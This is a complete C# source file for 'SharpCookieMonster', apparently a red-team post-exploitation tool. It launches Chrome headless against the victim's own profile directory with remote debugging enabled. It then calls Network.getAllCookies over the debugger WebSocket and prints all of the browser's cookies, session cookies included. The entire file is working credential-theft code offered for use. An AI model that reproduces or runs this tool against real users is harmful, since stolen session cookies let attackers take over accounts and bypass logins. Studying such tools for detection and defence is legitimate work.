using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using WebSocket4Net;

namespace SharpCookieMonster
{
    class Program
    {

        private static string banner = @"
                                                                              
                                                                                
                                                                                
                                       .&@#.  .#@@.                             
                      *&&((&@(       @/            *@                           
                   @            &( ,&  &@@@@/        &/                         
                 @                &@  @@@@@@@@        @.                        
                @.         #@@/    @  @@@@@@@/        @,      #@@               
                @        @@@@@@@@  &&                %%/(%%&#//(#...            
                /%       @@@@@@@@ *#(@*            ,@/(((//(/(/(((//(@.         
            .@(..#@,       %@@#  &/////#@@*.  .*&@#////////////////(/&@.        
            (&%((///(@(.     *&#(//(/////((//(/(((///(/(/(/(/(/(///////((%@     
        (@#//((/////((//(/(////(///////////////////////////////////@#/(/&@.     
       @&@@////(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/(/((///(@%//////(#@    
  %@@%(////////////////////////////((//(@@@#///@@%#///((&@@@@@@#////////(#&&(   
   @@&(///(//(/(/(//((/(///(///(//@//&@@@@@@@@@@@@@@@@@@@@@@@@(////(/(////#@@@/ 
    @#/(&&(////(///((@///%@(##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///////////%@@@&. 
   @#(/(#%@@&(//#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///(/(/(/(//@.    
   @#/(//(//(//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////(/////(//@.    
   ,@&///(/(/(///%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#(///(/(///#/&@     
     @&((//////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%///////////%&,      
      #@/(/(/(/(////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@((/(/(/(/(/((@.       
       &(/////////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#////////////((&        
      .@(%@(///(/(/(////%@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/(/(/(/(///(//#@%@.       
       .**.@/(/////////////(@@@@@@@@@@@@@@@@@@@@@@(///////////////(@/           
            @%((///(/(/(/(/////(/#&@@@@@@@@%((///(///(/(///((/(@/@&.            
             ,&@@(//////////////(////(((//((//(((////////////@(.                
                ,@@(/////////////(/(/(/(/(/(/(/(/(///((&%%@%,                   
                  .%@@(@@@#&@&(/////////////////////&@*                         
                          ,*, ,@@@@@@@@&&&&@@%/, ..                             
                                                                                
                                                                              ";
        static void Main(string[] args)
        {
            Console.WriteLine(banner);
            Console.WriteLine("                     SharpCookieMonster v1.0 by @m0rv4i\n");
            if (args.Length == 1 && (args[0] == "-h" || args[0] == "--help"))
            {
                Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [userdatadir]");
                return;
            }
            var url = "https://www.google.com";
            if (args.Length >= 1)
            {
                url = args[0];
                Console.WriteLine("[*] Accessing site: " + url);
            }
            var port = 9142;
            if (args.Length >= 2)
            {
                port = int.Parse(args[1]);
                Console.WriteLine("[*] Using chrome debugging port: " + port);
            }
            var userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data";
            if(args.Length == 3)
            {
                userdata = args[2];
            }
            Console.WriteLine("[*] Using data path: " + userdata);
            var pid = LaunchChromeHeadless(url, userdata, port);
            if (pid < 0)
            {
                // Ain't running - no point in continuing
                return;
            }
            var cookies = "";
            try
            {

                cookies = GrabCookies(port);

            }
            finally
            {
                Cleanup(pid);
            }
            if (String.IsNullOrEmpty(cookies))
            {
                Console.WriteLine("[-] No response or could not connect");
            }
            else if (!cookies.Contains("\"name\""))
            {
                Console.WriteLine("[-] Query successful but no cookies returned :(");
            }
            else
            {
                Console.WriteLine("[+] Cookies! OM NOM NOM\n\n");
                string pretty = cookies.Trim();
                pretty = pretty.Replace("{\"id\":1,\"result\":{\"cookies\":", "");
                pretty = pretty.Replace("}]}}", "}]");
                pretty = pretty.Replace(",", ",\n");
                pretty = pretty.Replace("},", "\n},");
                pretty = pretty.Replace("}]", "\n}\n]\n");
                pretty = pretty.Replace("{", " \n{\n");
                pretty = pretty.Replace("\n\"", "\n\t\"");
                pretty = pretty.Substring(0, pretty.LastIndexOf("]") + 1);
                Console.WriteLine(pretty);
            }
        }

        private static int LaunchChromeHeadless(string url, string userdata, int port)
        {
            using (Process chrome = new Process())
            {
                var chromes = Process.GetProcessesByName("chrome");
                var path = @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe";
                if (chromes.Length == 0)
                {
                    Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
                }
                else
                {
                    // Get the filepath of a running chrome process
                    path = chromes[0].MainModule.FileName;
                }
                chrome.StartInfo.UseShellExecute = false;
                chrome.StartInfo.FileName = path;
                chrome.StartInfo.Arguments = String.Format("\"{0}\" --headless --user-data-dir=\"{1}\" --remote-debugging-port={2}", url, userdata, port);
                chrome.StartInfo.CreateNoWindow = true;
                chrome.OutputDataReceived += (sender, args) => Console.WriteLine("[*][Chrome] {0}", args.Data);
                chrome.ErrorDataReceived += (sender, args) => Console.WriteLine("[-][Chrome] {0}", args.Data);
                chrome.StartInfo.RedirectStandardOutput = true;
                chrome.StartInfo.RedirectStandardError = true;
                chrome.Start();
                chrome.BeginOutputReadLine();
                chrome.BeginErrorReadLine();
                int pid = chrome.Id;
                Thread.Sleep(1000);
                Console.WriteLine("[*] Started chrome headless process: " + pid);
                try
                {
                    Process.GetProcessById(pid);
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
                    pid = 0;
                }
                if (!WaitForPort(port))
                {
                    Console.WriteLine("[-] Timed out waiting for debug port to open...");
                    return -1;
                }
                return pid;
            }

        }

        private static string GrabCookies(int port)
        {
            using (var webClient = new WebClient())
            {

                var regex = new Regex(String.Format("\"webSocketDebuggerUrl\":\\s*\"(ws://localhost:{0}/.*)\"", port));
                var response = webClient.DownloadString(String.Format("http://localhost:{0}/json", port));
                var match = regex.Match(response);
                if (!match.Success)
                {
                    Console.WriteLine("[-] Could not extract debug URL from chrome debugger service");
                    return null;
                }
                var debugUrl = match.Groups[1].Value;
                var cookiesRequest = "{\"id\": 1, \"method\": \"Network.getAllCookies\"}";
                Console.WriteLine("[*] Retrieved debug url: " + debugUrl);
                return WebSocketRequest35(debugUrl, cookiesRequest);
            }

        }


        private static void Cleanup(int pid)
        {
            try
            {
                if (pid != 0)
                {
                    Console.WriteLine("[*] Killing process " + pid);
                    Process.GetProcessById(pid).Kill();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error killing chrome process with pid {0}: {1}", pid, e);
            }
        }


        public static string WebSocketRequest35(string server, string data)
        {
            string result = "";
            bool datareceived = false;
            WebSocket websocket = new WebSocket(server);
            websocket.MessageReceived += new EventHandler<MessageReceivedEventArgs>(websocket_MessageReceived);
            websocket.Opened += new EventHandler(websocket_Opened);
            websocket.Open();
            var start = DateTime.Now;
            var now = DateTime.Now;
            while (!datareceived && now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
            {
                Thread.Sleep(500);
            }
            return result;

            void websocket_Opened(object sender, EventArgs e)
            {
                websocket.Send(data);
            }

            void websocket_MessageReceived(object sender, MessageReceivedEventArgs e)
            {
                result += e.Message;
                datareceived = true;
            }
        }

        private static bool WaitForPort(int port)
        {
            Console.WriteLine(String.Format("[*] Waiting for debugger port {0} to open...", port));
            var start = DateTime.Now;
            var now = DateTime.Now;
            while (now.Subtract(start).TotalMilliseconds < 30000) // 30s timeout
            {
                using (TcpClient tcpClient = new TcpClient())
                {
                    try
                    {
                        tcpClient.Connect("127.0.0.1", port);
                        Console.WriteLine("[+] Debugger port open");
                        return true;
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(500);
                        now = DateTime.Now;
                    }
                }
            }
            return false;
        }
    }

}
